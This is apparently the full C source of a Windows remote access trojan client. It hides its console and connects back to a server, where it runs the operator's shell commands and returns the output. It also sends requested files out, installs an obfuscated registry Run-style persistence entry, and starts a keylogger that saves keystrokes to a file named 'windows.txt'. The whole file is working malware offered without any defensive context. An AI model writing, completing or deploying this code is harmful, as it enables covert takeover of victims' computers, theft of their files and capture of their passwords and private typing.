#include "client.h"

int APIENTRY WinMain(HINSTANCE INSTANCE_HANDLER, HINSTANCE PREVIOUS_INSTANCE_HANDLER, LPSTR ARGV, int WINDOW_STATE)
{

    Initialize_Windows_Console();

    Initialize_Winsock();

    Define_Server_Node();

    while(ALWAYS)
    {
        Sleep(Reconnection_Delay); //0 in first iteration, 10000 for next

        Connection_Not_Established = true;

        Setup_Connection();
    }

    return 0;
}

void Initialize_Windows_Console()
{
    HWND CONSOLE_WINDOW;

    AllocConsole();

    CONSOLE_WINDOW = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(CONSOLE_WINDOW, SW_HIDE);
}


void Initialize_Winsock()
{
    while(WINSOCK_INITIALIZATION != SUCCESS)
    {
        WSADATA wsaData;

        WINSOCK_INITIALIZATION = WSAStartup(MAKEWORD(2,2), &wsaData);

        Sleep(Timeout_in_Milliseconds);

    }
}

void Define_Server_Node()
{
    memset(&Server_Address, 0, sizeof(Server_Address));

    Server_Address.sin_family = AF_INET;
    Server_Address.sin_port = htons(Server_Port);
    Server_Address.sin_addr.s_addr = inet_addr(Server_IP);
}

void Setup_Connection()
{
    while (Connection_Not_Established && Connection_Retries < Max_Retries)
    {
        Connect_to_Socket();

        Check_Connection();
    }
}

void Connect_to_Socket()
{
    Opened_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (Opened_Socket != INVALID_SOCKET)
    {
        Establishing_Connection = connect(Opened_Socket, (struct sockaddr *) &Server_Address, sizeof(Server_Address));

        setsockopt(Opened_Socket, SOL_SOCKET, SO_RCVTIMEO, (const char*) &Timeout_for_recv, sizeof(Timeout_for_recv)); //Setting timeout for recv() function in Listen_to_Master()
    }
}

void Reconnect()
{
    closesocket(Opened_Socket);

    Connection_Retries += 1;
    Timeout_in_Milliseconds *= 2;

    Sleep(Timeout_in_Milliseconds);
}

void Check_Connection()
{

    if (Establishing_Connection == SUCCESS)
    {
        Connection_Not_Established = false;

        Socket_is_Open = true;

        Draw_the_Shell();
    }
    else
        Reconnect();

}

void Draw_the_Shell()
{
    while(Socket_is_Open)
    {
        Fill_Bytes_With_Zero();

        Listen_to_Master();
    }
}

void Fill_Bytes_With_Zero()
{
    memset(&Masters_Command, 0, 1024);
    memset(&Buffer, 0, 1024);
    memset(&Response_to_Master, 0, 18384);
}

void Listen_to_Master()
{
    int Connection_Status = recv(Opened_Socket, Masters_Command, 1024, 0);

    if (Connection_Status != SOCKET_ERROR)
    {
        if (Masters_Command_Equal_to("cd "))
            chdir(take(Masters_Command, 3, 100));

        else if (Masters_Command_Equal_to("persist"))
            Initiate_Persistance();

        else if (Masters_Command_Equal_to("klg"))
            Initiate_Keylogger();

        else if (Masters_Command_Equal_to("download"))
            Upload_File();

        else if (Masters_Command_Equal_to("q"))
            Close_Socket();

        else
            Run_Masters_Command();
    }
    else
        Close_Socket();


}

int Masters_Command_Equal_to(char cmd[])
{
    return !strncmp(cmd, Masters_Command, strlen(cmd));
}

void Run_Masters_Command()
{
    Pipe = _popen(Masters_Command, "r");

    Get_Commands_Output();

    Send_Commands_Output();

    fclose(Pipe);
}

void Get_Commands_Output()
{
    size_t Bytes_Read = 0, //pronounce: bytes red
           Bytes_Filled = 0,
           Bytes_Left_to_Read = 0;

    while (Bytes_Filled < 18384 && fgets(Buffer, 1024, Pipe) != NULL)
    {
        Bytes_Read = strlen(Buffer);
        Bytes_Left_to_Read = 18384 - Bytes_Filled;

        if (Bytes_Read > Bytes_Left_to_Read) //Prevent overwriting especially when reading Pipe's last bytes
            Bytes_Read = Bytes_Left_to_Read;

        memcpy(Response_to_Master + Bytes_Filled, Buffer, Bytes_Read);

        Bytes_Filled += Bytes_Read;

        Response_to_Master[Bytes_Filled] = '\0';

    }
}

void Send_Commands_Output()
{
    send(Opened_Socket, Response_to_Master, sizeof(Response_to_Master), 0);
}
void Initiate_Keylogger()
{
    HANDLE NEW_THREAD = CreateThread(NULL, 0, KEYLOGGER, NULL, 0, NULL);
}

void Close_Socket()
{
    closesocket(Opened_Socket);

    Socket_is_Open = false;

    Establishing_Connection = -1;

    Reconnection_Delay = 10000;
}

void Initiate_Persistance()
{

    Find_Programs_Execution_Path();

    Open_Registry_Key();

    Write_Value_in_Registry();

    RegCloseKey(Registry_Key);

	SEND_SUCCESS();

}

char * DECIPHER(int Cipher[], size_t Cipher_Length)
{
    char *Deciphered_String = calloc(Cipher_Length + 1, sizeof(char));

    for (int i = 0; i < Cipher_Length; i++)
    {
        int EACH_LETTER = Cipher[i]-1;
        int EACH_LETTER_In_ALPHABETS = ALPHABETS[EACH_LETTER];
        Deciphered_String[i] = (char) ((EACH_LETTER_In_ALPHABETS + 6) / 2);
    }

    Deciphered_String[Cipher_Length] = '\0';

    return Deciphered_String;
}

char* take(char Masters_Command[], size_t Current_Index, size_t Final_Index)
{
    char *Commands_Arguments;

    Commands_Arguments = calloc(Final_Index, sizeof(char));

    for (int i = 0; Current_Index < Final_Index; i++, Current_Index++)
        Commands_Arguments[i] = Masters_Command[Current_Index];

    Commands_Arguments[++Final_Index] = '\0';

    return Commands_Arguments;
}

void SEND_SUCCESS()
{
    send(Opened_Socket, DECIPHER(SUCCESS_STRING, 10), 10, 0);
}

void SEND_ERROR()
{
    send(Opened_Socket, DECIPHER(ERROR_STRING, 6), 6, 0);
}

void Find_Programs_Execution_Path()
{
    Execution_Path_Length = GetModuleFileName(NULL, Execution_Path, MAX_PATH);

    if (Execution_Path_Length == 0)
        SEND_ERROR();
}

void Open_Registry_Key()
{
    int STATUS = RegOpenKey(HKEY_CURRENT_USER, DECIPHER(Encoded_Registry_Path, 49), &Registry_Key);

    if (STATUS != ERROR_SUCCESS)
        SEND_ERROR();
}

void Write_Value_in_Registry()
{
    DWORD Execution_Path_Length_in_Bytes = Execution_Path_Length * sizeof(Execution_Path[0]);

    int STATUS = RegSetValueEx(Registry_Key, DECIPHER(Encoded_Registry_Value_Name, 23), 0, REG_SZ, (LPBYTE)Execution_Path, Execution_Path_Length_in_Bytes);

	if (STATUS != ERROR_SUCCESS)
		SEND_ERROR();
}

bool Upload_File()
{
    //char *Path_to_Download = calloc(MAX_PATH, sizeof(char));

    //strcpy(Path_to_Download, take(Masters_Command, 9, MAX_PATH));

    char *File_Path_to_Upload = take(Masters_Command, 9, MAX_PATH);

    FILE *File_to_Upload = fopen(File_Path_to_Upload, "rb");

    char *Filename = strrchr(File_Path_to_Upload, '\\');
    Filename = (Filename) ? Filename + 1 : File_Path_to_Upload;

    if (File_to_Upload == NULL)
        return false;

    if (send(Opened_Socket, Filename, strlen(Filename), 0) == -1)
        return false;

    while(fread(Buffer, 1, sizeof(Buffer), File_to_Upload) > 0)
        if (send(Opened_Socket, Buffer, strlen(Buffer), 0) == -1)
        {
            fclose(File_to_Upload);
            return false;
        }

        /*while(fgets(Buffer, 1024, File_to_be_Downloaded) != NULL)
        {
            if (send(Opened_Socket, Buffer, strlen(Buffer), 0) == -1)
            {
                fclose(File_to_be_Downloaded);
                return false;
            }
        }*/


    fclose(File_to_Upload);
    return true;

}

DWORD WINAPI KEYLOGGER(){
	int vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";
	FILE *kh;
	char KEY_LOG_FILE[]="windows.txt";
	//: making last key state 0
	for(vkey=0;vkey<0xFF;vkey++){
		last_key_state[vkey]=0;
	}

	//: running infinite
	while(1){
		//: take rest for 10 millisecond
		Sleep(10);

		//: get key state of CAPSLOCK,NUMLOCK
		//: and LEFT_SHIFT/RIGHT_SHIFT
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

		//: cheking state of all virtual keys
		for(vkey=0;vkey<0xFF;vkey++){
			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
			showKey=(char)vkey;
			if(isPressed==1 && last_key_state[vkey]==0){

				//: for alphabets
				if(vkey>=0x41 && vkey<=0x5A){
					if(isCAPSLOCK==0){
						if(isL_SHIFT==0 && isR_SHIFT==0){
							showKey=(char)(vkey+0x20);
						}
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=(char)(vkey+0x20);
					}
				}

				//: for num chars
				else if(vkey>=0x30 && vkey<=0x39){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=NUMCHAR[vkey-0x30];
					}
				}

				//: for right side numpad
				else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1){
					showKey=(char)(vkey-0x30);
				}

				//: for printable chars
				else if(vkey>=0xBA && vkey<=0xC0){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vs[vkey-0xBA];
					}
					else{
						showKey=chars_vn[vkey-0xBA];
					}
				}
				else if(vkey>=0xDB && vkey<=0xDF){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vb[vkey-0xDB];
					}
					else{
						showKey=chars_va[vkey-0xDB];
					}
				}

				//: for right side chars ./*-+..
				//: for chars like space,\n,enter etc..
				//: for enter use newline char
				//: don't print other keys
				else if(vkey==0x0D){
					showKey=(char)0x0A;
				}
				else if(vkey>=0x6A && vkey<=0x6F){
					showKey=(char)(vkey-0x40);
				}
				else if(vkey!=0x20 && vkey!=0x09){
					showKey=(char)0x00;
				}

				//:print_and_save_captured_key
				if(showKey!=(char)0x00){
					kh=fopen(KEY_LOG_FILE,"a");
					putc(showKey,kh);
					fclose(kh);
				}
			}
			//: save last state of key
			last_key_state[vkey]=isPressed;
		}


	}//;end_of_while_loop
}//;end_of_main_function


//Handle interrupts
//build using -lwsock32 and -lws2_32
